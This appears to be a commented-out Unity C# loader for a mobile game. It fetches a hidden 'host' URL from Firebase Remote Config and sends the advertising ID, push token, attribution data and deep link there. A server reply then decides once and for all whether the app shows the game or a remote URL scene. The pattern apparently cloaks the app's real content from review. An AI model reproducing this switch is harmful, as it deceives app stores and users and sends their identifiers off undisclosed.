/*
using System;
using System.Collections;
using System.Collections.Generic;
using System.Threading.Tasks;
using AppsFlyerSDK;
using Facebook.Unity;
using Firebase;
using Firebase.Extensions;
using Firebase.RemoteConfig;
using OneSignalSDK;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class BigGray : MonoBehaviour
{
    [Header("AppsFlyer")] public string devKey;
    [HideInInspector] public string appID;
    [HideInInspector] public string UWPAppID;
    [HideInInspector] public string macOSAppID;
    [HideInInspector] public bool isDebug = false;
    public bool getConversionData = true;

    public System.Action<string> OnConversionRecieved;

    [Header("Core Settings")] [SerializeField]
    private string _signalKey;

    [SerializeField] private string _firebaseKey;

    [Header("PlayerPrefs Settings")] [SerializeField]
    private string _loadTypeKey = "Key";

    [SerializeField] private string _loadTypeGame = "Game";
    [SerializeField] private string _loadTypeView = "View";

    [Header("Other Settings")] [SerializeField]
    private ScreenOrientation _screenOrientation = ScreenOrientation.Portrait;

    [SerializeField] private bool _isDebug = false;

    private string _conversionData, _appToken, _loadType, _remoteValue;
    private FirebaseMessaging _firebaseMessaging;
    private FacebookInitializer _facebookInitializer;
    private FirebaseRemote _firebaseRemote;

    public void onConversionDataSuccess(string conversionData)
    {
        AppsFlyer.AFLog("didReceiveConversionData", conversionData);
        Dictionary<string, object> conversionDataDictionary = AppsFlyer.CallbackStringToDictionary(conversionData);

        OnConversionRecieved?.Invoke(conversionData);
    }

    public void onConversionDataFail(string error)
    {
        AppsFlyer.AFLog("didReceiveConversionDataWithError", error);
    }

    private void StartAppsFlyer()
    {
        AppsFlyer.setIsDebug(isDebug);
#if UNITY_WSA_10_0 && !UNITY_EDITOR
        AppsFlyer.initSDK(devKey, UWPAppID, getConversionData ? this : null);
#elif UNITY_STANDALONE_OSX && !UNITY_EDITOR
    AppsFlyer.initSDK(devKey, macOSAppID, getConversionData ? this : null);
#else
        AppsFlyer.initSDK(devKey, appID, getConversionData ? this : null);
#endif

        AppsFlyer.startSDK();
    }

    private void SwitchScene()
    {
        _loadType = PlayerPrefs.GetString(_loadTypeKey);
        if (_loadType == _loadTypeGame)
        {
            SceneManager.LoadScene(1);
        }
        else if (_loadType == _loadTypeView)
        {
            SceneManager.LoadScene(2);
        }
    }

    private void Awake()
    {
        Screen.orientation = _screenOrientation;

        _firebaseMessaging = new FirebaseMessaging();
        _facebookInitializer = new FacebookInitializer();
    }

    private void Start()
    {
        _firebaseMessaging.Start();
        OneSignalInit();
        StartAppsFlyer();

        _loadType = PlayerPrefs.GetString(_loadTypeKey);

        if (!string.IsNullOrEmpty(_loadType))
        {
            SwitchScene();
        }
        else
        {
            if (CheckInternetConnection())
            {
                _firebaseMessaging.OnWorkDone += CheckIfReady;
            }
            else
            {
                PlayerPrefs.SetString(_loadTypeKey, _loadTypeGame);

                SwitchScene();
            }
        }
    }

    private bool CheckInternetConnection()
    {
        return !(Application.internetReachability == NetworkReachability.NotReachable);
    }

    private void CheckIfReady()
    {
        Firebase.FirebaseApp.CheckAndFixDependenciesAsync().ContinueWith(task =>
        {
            Firebase.DependencyStatus dependencyStatus = task.Result;
            if (dependencyStatus == Firebase.DependencyStatus.Available)
            {
                if (_isDebug) Debug.Log("Firebase is ready for use.");

                _firebaseRemote = new FirebaseRemote();
                _firebaseRemote.FetchCompleted += ApplyRemoteConfig;
                _firebaseRemote.Run(_firebaseKey);
            }
            else
            {
                UnityEngine.Debug.LogError(System.String.Format(
                    "Could not resolve all Firebase dependencies: {0}", dependencyStatus));
            }
        });
    }

    private void OneSignalInit()
    {
        OneSignal.Default.Initialize(_signalKey);

        var permission = OneSignal.Default.NotificationPermission;

        switch (permission)
        {
            case NotificationPermission.NotDetermined:
            case NotificationPermission.Denied:
                OneSignal.Default.PromptForPushNotificationsWithUserResponse();
                break;
        }
    }

    private void ApplyRemoteConfig(Dictionary<string, object> data)
    {
        if (data == null)
        {
            if (_isDebug) Debug.Log("<color=red>RemoteConfig is null</color>");

            PlayerPrefs.SetString(_loadTypeKey, _loadTypeGame);

            SwitchScene();
            return;
        }
        
        _remoteValue = data["host"] != null ? data["host"].ToString() : string.Empty;
        if (_remoteValue != string.Empty) Debug.Log(_remoteValue);
           

        StartCoroutine(WaitForConversionData());
    }

    private IEnumerator WaitForConversionData()
    {
        if (_isDebug) Debug.Log("<color=blue>1/7</color> Waiting for ConversionData");

        while (_conversionData == null)
        {
            yield return null;
        }

        StartCoroutine(WaitForFacebookInit());
    }

    private IEnumerator WaitForFacebookInit()
    {
        if (_isDebug) Debug.Log("<color=blue>2/7</color> Waiting for Facebook");

        bool isFBReady = false;

        _facebookInitializer.OnFinish += s => isFBReady = true;

        _facebookInitializer.Run();

        while (!isFBReady)
        {
            yield return null;
        }

        CheckRemoteValue();
    }

    private void CheckRemoteValue()
    {
        if (_isDebug) Debug.Log("<color=blue>3/7</color> Cheking Remote Value");

        if (!string.IsNullOrEmpty(_remoteValue))
        {
            if (_isDebug) Debug.Log("<color=blue>4/7</color><color=green> Remote Value passed</color>");

            var data = new Dictionary<string, object>()
            {
                { "hash", AppsFlyer.getAppsFlyerId() },
                { "app", Application.identifier },
                { "fcm_push_token", _appToken },
                { "data", AppsFlyer.CallbackStringToDictionary(_conversionData) },
                { "deeplink", PlayerPrefs.GetString("DeepLink") },
                { "gaid", GetGaid() },
                { "device_info", new Dictionary<string, object>
                {
                    { "charging", SystemInfo.batteryStatus == BatteryStatus.Charging }
                }
                    
                }
            };

            StartCoroutine(TryRequest(data));
        }
        else
        {
            if (_isDebug) Debug.Log("<color=blue>4/7</color><color=red> Remote Value not passed</color>");

            PlayerPrefs.SetString(_loadTypeKey, _loadTypeGame);

            SwitchScene();
        }
    }

    private IEnumerator TryRequest(Dictionary<string, object> data)
    {
        if (_isDebug) Debug.Log("<color=blue>5/7</color> Trying Request with remoteValue = " + _remoteValue);
        UnityWebRequest request = UnityWebRequest.Put
        (
            _remoteValue,
            AFMiniJSON.Json.Serialize(data)
        );

        request.SetRequestHeader("Content-Type", "application/json");
        request.SetRequestHeader("accept", "application/json");
        request.SetRequestHeader("User-Agent", $"{SystemInfo.deviceModel} / {SystemInfo.operatingSystem}");

        yield return request.SendWebRequest();

        if (request.result != UnityWebRequest.Result.Success)
        {
            if (_isDebug) Debug.Log("<color=blue>6/7</color><color=red> UnityWebRequest failed</color>");

            PlayerPrefs.SetString(_loadTypeKey, _loadTypeGame);

            SwitchScene();
        }
        else
        {
            if (_isDebug) Debug.Log("<color=blue>6/7</color><color=green> UnityWebRequest sucsess</color>");

            Dictionary<string, object> response = AppsFlyer.CallbackStringToDictionary(request.downloadHandler.text);

            if ((bool)response["success"])
            {
                if (_isDebug) Debug.Log("<color=blue>7/7</color><color=green> Response sucsess</color>");

                PlayerPrefs.SetString(_loadTypeKey, _loadTypeView);
                PlayerPrefs.SetString("url", response["url"].ToString());

                SwitchScene();
            }
            else
            {
                if (_isDebug) Debug.Log("<color=blue>7/7</color><color=red> Response failed</color>");

                PlayerPrefs.SetString(_loadTypeKey, _loadTypeGame);

                SwitchScene();
            }
        }
    }

    private string GetGaid()
    {
        if (_isDebug) Debug.Log("<color=yellow>Getting Gaid</color>");

        string ID = string.Empty;
        try
        {
            var up = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
            var currentActivity = up.GetStatic<AndroidJavaObject>("currentActivity");
            var client = new AndroidJavaClass("com.google.android.gms.ads.identifier.AdvertisingIdClient");
            var adInfo = client.CallStatic<AndroidJavaObject>("getAdvertisingIdInfo", currentActivity);
            ID = adInfo.Call<string>("getId").ToString();
        }
        catch (Exception)
        {
        }

        return ID;
    }

    private void onConversionRecieved(string conversionData)
    {
        _conversionData = conversionData;

        if (_isDebug) Debug.Log("<color=green>Sucsess: </color>ConversionDataSuccess");
    }

    private void onAppTokenRecieved(string appToken)
    {
        _appToken = appToken;

        if (_isDebug) Debug.Log("<color=green>Sucsess: </color>AppTokenSucsess");
    }

    [System.Serializable]
    public class FacebookInitializer
    {
        public System.Action<string> OnFinish;

        public void Run()
        {
            if (!FB.IsInitialized)
            {
                FB.Init(SetDeepLink);
                return;
            }

            SetDeepLink();
        }

        private void SetDeepLink()
        {
            if (FB.IsInitialized)
            {
                FB.ActivateApp();
                FB.Mobile.SetAdvertiserIDCollectionEnabled(true);
                FB.Mobile.SetAdvertiserTrackingEnabled(true);
                FB.Mobile.FetchDeferredAppLinkData(DeepLink);
                return;
            }

            Debug.Log("Failed to Initialize the Facebook SDK");
        }

        private void DeepLink(IAppLinkResult result)
        {
            if (!string.IsNullOrEmpty(result.TargetUrl))
            {
                PlayerPrefs.SetString("DeepLink", result.TargetUrl);
            }

            OnFinish?.Invoke(result.TargetUrl);
        }
    }

    public class FirebaseMessaging
    {
        private FirebaseApp app;

        private string _token;
        public string Token => _token;

        public System.Action<string> OnGetToken;
        public System.Action OnWorkDone;

        public void Start()
        {
            FirebaseApp.CheckDependenciesAsync().ContinueWith(task =>
            {
                var dependencyStatus = task.Result;
                if (dependencyStatus == Firebase.DependencyStatus.Available)
                {
                    app = FirebaseApp.DefaultInstance;
                    Firebase.Messaging.FirebaseMessaging.TokenReceived += OnTokenReceived;
                    Firebase.Messaging.FirebaseMessaging.MessageReceived += OnMessageReceived;
                }
            });
        }

        public void OnTokenReceived(object sender, Firebase.Messaging.TokenReceivedEventArgs token)
        {
            UnityEngine.Debug.Log("Received Registration Token: " + token.Token);
            _token = token.Token;
            OnGetToken?.Invoke(_token);
            OnWorkDone?.Invoke();
        }

        public void OnMessageReceived(object sender, Firebase.Messaging.MessageReceivedEventArgs e)
        {
            if (!e.Message.Data.ContainsKey("postback_click_url"))
                return;
            var request = UnityWebRequest.Get(e.Message.Data["postback_click_url"]);
            request.SendWebRequest();
        }
    }

    public class FirebaseRemote
    {
        private string firebaseKey;

        private Dictionary<string, object> defaults;

        private Firebase.DependencyStatus dependencyStatus = Firebase.DependencyStatus.UnavailableOther;

        public Action<Dictionary<string, object>> FetchCompleted;

        public Action TaskCompleted;

        public void Run(string firebaseKey)
        {
            this.firebaseKey = firebaseKey;

            SetDefaultSetting();

            Firebase.FirebaseApp.CheckAndFixDependenciesAsync().ContinueWith(task =>
            {
                dependencyStatus = task.Result;

                Debug.Log($"Status - {dependencyStatus}");

                if (dependencyStatus == Firebase.DependencyStatus.Available)
                    FetchDataAsync();
                else
                    Debug.LogError("Could not resolve all Firebase dependencies: " + dependencyStatus);
            });
        }

        private void SetDefaultSetting()
        {
            defaults = BuildDefaults();

            FirebaseRemoteConfig.DefaultInstance.SetDefaultsAsync(defaults)
                .ContinueWithOnMainThread(task => { Debug.Log("Defaults data loaded"); });
        }

        private Task FetchDataAsync()
        {
            Debug.Log("Fetching data...");
            var temp = Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.FetchAsync(TimeSpan.MinValue);
            return temp.ContinueWithOnMainThread(FetchComplete);
        }

        private void FetchComplete(Task fetchTask)
        {
            if (!fetchTask.IsCompleted)
            {
                Debug.LogError("Retrieval hasn't finished.");
                return;
            }

            var remoteConfig = FirebaseRemoteConfig.DefaultInstance;
            var info = remoteConfig.Info;

            if (info.LastFetchStatus != LastFetchStatus.Success)
            {
                Debug.LogError(
                    $"{nameof(FetchComplete)} was unsuccessful\n{nameof(info.LastFetchStatus)}: {info.LastFetchStatus}");
                return;
            }

            remoteConfig.ActivateAsync().ContinueWithOnMainThread(task =>
            {
                Debug.Log($"Remote data loaded and ready for use. Last fetch time {info.FetchTime}.");

                string data;
                Dictionary<string, object> allData;


                data = Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.GetValue(firebaseKey).StringValue;
                if (string.IsNullOrEmpty(data))
                {
                    FetchCompleted?.Invoke(null);
                    return;
                }

                allData = AppsFlyer.CallbackStringToDictionary(data);
                FetchCompleted?.Invoke(allData);


                string host = allData["host"] != null ? allData["host"].ToString() : string.Empty;
                Debug.Log($"Host - {host}");
                TaskCompleted?.Invoke();
            });
        }

        private Dictionary<string, object> BuildDefaults()
        {
            return new Dictionary<string, object>
            {
                { "host", "" },
                { "oneSignal", "" },
                { "AppMetrica", "" },
                { "AppsFlyerEnable", true }
            };
        }
    }

    #region LifeCycle

    private void OnEnable()
    {
        _firebaseMessaging.OnGetToken += onAppTokenRecieved;
        OnConversionRecieved += onConversionRecieved;
    }

    private void OnDisable()
    {
        _firebaseMessaging.OnGetToken -= onAppTokenRecieved;
        OnConversionRecieved -= onConversionRecieved;

        PlayerPrefs.Save();
    }

    #endregion

    public struct DeviceData
    {
        public bool charging;
    }

    public struct userAttributes
    {
        public bool expansionFlag;
    }

    public struct appAttributes
    {
        public int level;
        public int score;
        public string appVersion;
    }
}

*/